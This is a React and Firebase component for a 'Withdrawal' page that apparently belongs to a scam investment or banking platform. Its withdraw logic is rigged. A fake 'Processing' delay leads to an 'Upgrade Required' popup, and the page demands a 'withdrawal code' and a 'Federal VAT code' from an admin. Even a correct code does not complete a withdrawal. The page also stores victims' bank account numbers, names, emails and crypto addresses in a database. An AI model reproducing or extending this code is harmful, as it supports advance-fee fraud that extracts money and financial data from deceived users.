import React, { useState, useEffect } from 'react';
import { auth, db } from '../firebaseconfig';
import { doc, getDoc, addDoc, collection } from 'firebase/firestore';
import { Dialog } from '@headlessui/react';
import Sidenav from '../components/Sidenav';

const Bank = () => {
  const [userData, setUserData] = useState(null);
  const [paymentMethod, setPaymentMethod] = useState('Bank'); // Default method set to Bank
  const [accountNumber, setAccountNumber] = useState('');
  const [accountHolderName, setAccountHolderName] = useState('');
  const [bankName, setBankName] = useState('');
  const [email, setEmail] = useState('');
  const [cryptoAddress, setCryptoAddress] = useState('');
  const [cryptoType, setCryptoType] = useState('BTC'); // Default cryptocurrency type
  const [amount, setAmount] = useState('');
  const [loading, setLoading] = useState(false);
  const [showUpgradePopup, setShowUpgradePopup] = useState(false);
  const [showCodePopup, setShowCodePopup] = useState(false);
  const [showAdminPopup, setShowAdminPopup] = useState(false);
  const [code, setCode] = useState('');

  useEffect(() => {
    const fetchUserData = async () => {
      const user = auth.currentUser;
      if (user) {
        const userDoc = await getDoc(doc(db, 'users', user.uid));
        if (userDoc.exists()) {
          setUserData(userDoc.data());
        }
      }
    };

    fetchUserData();
  }, []);
  // userData.accountLevel <= 1
  // setShowUpgradePopup(true);

  const handleWithdraw = () => {
    if (userData.accountLevel <= 1) {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setShowUpgradePopup(true);
      }, 2000);
    } else if (parseFloat(amount) <= userData.accountBalance) {
      setShowCodePopup(true);
    } else {
      alert('Transfer pending, kindly contact admin.');
    }
  };

  const handleCodeSubmit = async () => {
    const user = auth.currentUser;

    if (user) {
      // Log the values to check if they are what you expect
      console.log('User Data VAT:', userData.vatCode);
      console.log('Input Code:', code);

      // Add withdrawal details to the database
      await addDoc(collection(db, 'withdrawals'), {
        uid: user.uid,
        accountNumber,
        accountHolderName,
        bankName,
        email,
        cryptoAddress,
        cryptoType,
        amount: parseFloat(amount),
        timestamp: new Date(),
      });

      // Check if VAT code matches
      if (String(userData.vatCode) === String(code)) {
        setShowUpgradePopup(true);
      } else {
        alert('Wrong VAT code. Please try again.');
      }

    }
  };



  const handleSetCode = () => {
    setShowAdminPopup(true);
  };

  return (
    <div className="container mx-auto p-4 text-gray-900 font-sans">
      <Sidenav />
      <div className="flex mb-6">
        <h2 className="text-2xl font-bold ">Withdrawal</h2>
      </div>
      <div className="flex flex-col mx-auto w-full max-w-md">
        {/* Payment Method Selection */}
        <div className="mb-4">
          <label className="block mb-2 text-lg font-medium">Select Payment Method</label>
          <select
            value={paymentMethod}
            onChange={(e) => setPaymentMethod(e.target.value)}
            className="border border-gray-300 rounded w-full py-2 px-3"
          >
            <option value="Bank">Bank</option>
            <option value="PayPal">PayPal</option>
            <option value="CashApp">CashApp</option>
            <option value="Crypto">Cryptocurrency</option>
          </select>
        </div>

        {/* Conditional Inputs Based on Payment Method */}
        {paymentMethod === 'Bank' && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Number</label>
              <input
                type="number"
                placeholder="Account Number"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Bank Name</label>
              <input
                type="text"
                placeholder="Bank Name"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Holder Name</label>
              <input
                type="text"
                placeholder="Account Holder Name"
                value={accountHolderName}
                onChange={(e) => setAccountHolderName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
          </>
        )}

        {(paymentMethod === 'PayPal' || paymentMethod === 'CashApp') && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Email</label>
              <input
                type="email"
                placeholder="Email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Account Holder Name</label>
              <input
                type="text"
                placeholder="Account Holder Name"
                value={accountHolderName}
                onChange={(e) => setAccountHolderName(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
          </>
        )}

        {paymentMethod === 'Crypto' && (
          <>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Crypto Address</label>
              <input
                type="text"
                placeholder="Crypto Address"
                value={cryptoAddress}
                onChange={(e) => setCryptoAddress(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
            </div>
            <div className="mb-4">
              <label className="block mb-2 text-lg font-medium">Select Cryptocurrency</label>
              <select
                value={cryptoType}
                onChange={(e) => setCryptoType(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              >
                <option value="BTC">Bitcoin (BTC)</option>
                <option value="ETH">Ethereum (ETH)</option>
                <option value="USDT">Tether (USDT)</option>
              </select>
            </div>
          </>
        )}

        {/* Common Amount Input */}
        <div className="mb-4">
          <label className="block mb-2 text-lg font-medium">Amount</label>
          <input
            type="number"
            placeholder="Amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="border border-gray-300 rounded w-full py-2 px-3"
          />
        </div>

        {/* Withdraw Button with Loading State */}
        <button
          onClick={handleWithdraw}
          className={`bg-[#cc6f3d] text-white py-2 px-4 rounded-lg w-full ${loading ? 'cursor-not-allowed' : ''}`}
          disabled={loading}
        >
          {loading ? 'Processing...' : 'Withdraw'}
        </button>
      </div>

      {/* Upgrade Popup */}
      <Dialog open={showUpgradePopup} onClose={() => setShowUpgradePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg">
            <Dialog.Title className="text-lg font-bold">Upgrade Required</Dialog.Title>
            <div className="mt-4">
              <p>Your account level is too low for this transaction. Please upgrade to level 2.</p>
              <button
                onClick={() => setShowUpgradePopup(false)}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </Dialog>

      {/* Enter Code Popup */}
      <Dialog open={showCodePopup} onClose={() => setShowCodePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg">
            <Dialog.Title className="text-lg font-bold">Please enter your withdrawal code</Dialog.Title>
            <div className="mt-4">
              <input
                type="text"
                placeholder="Enter 4-Digit Code"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="border border-gray-300 rounded w-full py-2 px-3"
              />
              <button
                onClick={handleCodeSubmit}
                className="mt-4 bg-green-500 text-white py-2 px-4 rounded-lg mr-3"
              >
                Submit
              </button>
              <button
                onClick={handleSetCode}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                Set Code
              </button>
            </div>
          </div>
        </div>
      </Dialog>

      {/* Contact Admin Popup */}
      <Dialog open={showAdminPopup} onClose={() => setShowAdminPopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg">
            <Dialog.Title className="text-lg font-bold">Contact Admin</Dialog.Title>
            <div className="mt-4">
              <p>The Federal VAT code is required before this transaction can be completed successfully.</p>
              <button
                onClick={() => setShowAdminPopup(false)}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </Dialog>
    </div>
  );
};

export default Bank;